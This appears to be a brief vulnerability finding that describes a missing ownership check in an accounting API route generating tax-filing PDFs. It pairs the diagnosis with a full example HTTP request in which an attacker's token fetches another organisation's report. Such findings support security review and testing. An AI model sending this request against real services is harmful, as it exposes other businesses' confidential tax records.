diagnosis: The route handler accepts reportId from route parameters and dispatches a Node.js Worker Thread to generate and export tax filing PDFs without verifying that the authenticated user (req.user.id) owns or has authorization to access the tax report. An attacker can supply arbitrary reportId values to generate presigned download links for other businesses' tax filings.
exploit_request:
POST /api/reports/tax-pdf/rep_tax_2025_org_99182/generate HTTP/1.1
Host: accounting.fincloud.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"format": "PDF/A"}
